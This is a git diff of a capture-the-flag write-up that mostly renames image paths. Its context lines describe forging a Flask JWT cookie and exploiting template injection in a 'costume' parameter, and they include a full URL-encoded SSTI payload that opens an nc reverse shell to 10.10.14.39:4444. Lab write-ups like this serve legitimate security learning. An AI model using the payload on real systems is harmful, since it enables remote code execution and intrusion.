@@ -47,7 +47,7 @@ PORT     STATE SERVICE VERSION
 
 Port 5000 presented a login page with some cool art:
 
-<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (62) (3).png" alt=""><figcaption></figcaption></figure>
 
 This was a Werkzeug application, which indicates it might be running Flask. The login function presented nothing of interest.
 
@@ -216,11 +216,11 @@ def index():
 
 With this secret, we can forge a cookie easily. I used jwt.io to create a token easily.
 
-<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (60) (1).png" alt=""><figcaption></figcaption></figure>
 
 Afterwards, when trying to visit the webpage, we are granted access.
 
-<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (59) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### SSTI
 
@@ -267,7 +267,7 @@ costume=goggles&q=test&addr=test
 
 A quick test reveals the `costume` parameter to be the injection point using `{{config.items()}}`.
 
-<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (58) (1).png" alt=""><figcaption></figcaption></figure>
 
 Here's a payload I used that got me a reverse shell:
 
@@ -275,7 +275,7 @@ Here's a payload I used that got me a reverse shell:
 {{+self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.39%204444%20%3E%2Ftmp%2Ff').read()+}}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (57) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -359,4 +359,4 @@ drwx------  2 tom tom 4096 Dec 20  2021 .ssh
 
 We can easily get a root shell via SSH.
 
-<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (61) (3).png" alt=""><figcaption></figcaption></figure>
